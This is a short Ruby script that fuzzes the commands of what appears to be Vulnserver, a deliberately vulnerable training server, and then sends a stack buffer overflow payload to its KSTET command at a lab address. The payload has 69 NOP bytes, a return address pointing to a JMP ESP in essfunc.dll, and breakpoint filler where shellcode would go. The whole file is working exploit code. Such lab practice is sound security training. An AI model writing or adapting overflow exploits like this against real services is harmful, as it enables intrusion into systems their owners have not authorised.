#!/usr/bin/env ruby

require 'socket'

#Array com os comandos
commands = ["", "HELP", "STATS", "RTIME", "LTIME", "SRUN", "TRUN", "GMON", "GDOG", "HTER", "LTER", "KSTAN"] # put commands in array
char = "\x41"

#All array itens
expl = Array.new
commands.each do |cmd|
    expl << cmd + " " + char * 500
    puts char + " - " + cmd
    char = char.next
end


#EIP = 0x41336341 -> Offset = 69
badHeader = "KSTET ."
badData = "\x90" * 69
badData += "\xAF\x11\x50\x62" # Memory address 0x625011AF # JMP ESP essfunc.dll
badData += "\xcc" * (1000 - badData.size)

host = "192.168.0.78" # ARGV[0]
port = "9999"  # ARGV[1]

# Config Server
s = TCPSocket.new(host, port)
receive = s.recv(1024)
puts receive
puts "[+] Sending All buffer"
expl.each do |buff|
    s.send(buff, 0)
    s.recv(1024)
end

puts "[+] Sending Evil buffer"
s.send(badHeader + badData, 0)
s.close